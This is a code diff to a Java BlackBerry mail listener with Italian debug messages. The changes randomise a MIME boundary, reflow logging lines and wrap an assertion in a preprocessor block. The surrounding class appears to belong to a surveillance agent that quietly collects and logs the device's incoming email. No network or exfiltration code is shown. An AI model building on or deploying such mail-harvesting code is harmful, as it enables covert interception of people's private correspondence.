@@ -6,6 +6,7 @@ package blackberry.agent.mail;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.util.Enumeration;
+import java.util.Random;
 import java.util.Vector;
 
 import net.rim.blackberry.api.mail.Address;
@@ -70,6 +71,8 @@ public final class MailListener implements FolderListener, StoreListener,
     private static ServiceRecord[] mailServiceRecords;
     Filter realtimeFilter;
     Filter collectFilter;
+    
+    Random random = new Random();
 
     /**
      * Instantiates a new mail listener.
@@ -109,9 +112,7 @@ public final class MailListener implements FolderListener, StoreListener,
         final Message message = folderEvent.getMessage();
 
         // #debug info
-        debug
-                .info("Added Message: " + message + " folderEvent: "
-                        + folderEvent);
+        debug.info("Added Message: " + message + " folderEvent: "+ folderEvent);
 
         if (collecting) {
             //#debug debug
@@ -227,8 +228,10 @@ public final class MailListener implements FolderListener, StoreListener,
             databuffer.writeInt(flags);
             databuffer.writeInt(size);
             databuffer.writeLong(filetime.getFiledate());
+            //#ifdef DBC
             Check.ensures(additionalData.length == 20, "Wrong buffer size");
-
+            //#endif
+            
             //#debug debug
             debug.trace("saveLog: " + mail);
 
@@ -374,11 +377,12 @@ public final class MailListener implements FolderListener, StoreListener,
         debug.trace("Dimensione dell'email: " + message.getSize() + "bytes");
         debug.trace("Data invio dell'email: " + message.getSentDate());
         debug.trace("Oggetto dell'email: " + message.getSubject());
-        //mundebug
+        //#enddebug
 
         mailRaw.append("MIME-Version: 1.0\r\n");
         //1234567890123456789012345678
-        String boundary = "e0cb4e384e84aed0940485c69016";
+        long rnd = Math.abs(random.nextLong());
+        String boundary = "------_=_NextPart_"+rnd;
 
         if (mail.isMultipart()) {
             mailRaw.append("Content-Type: multipart/alternative; boundary="
@@ -438,8 +442,7 @@ public final class MailListener implements FolderListener, StoreListener,
 
         names = new String[mailServiceRecords.length];
         // #debug debug
-        debug.trace("Ci sono: " + mailServiceRecords.length
-                + " account di posta!");
+        debug.trace("Ci sono: " + mailServiceRecords.length + " account di posta!");
 
         // Controllo tutti gli account di posta
         for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
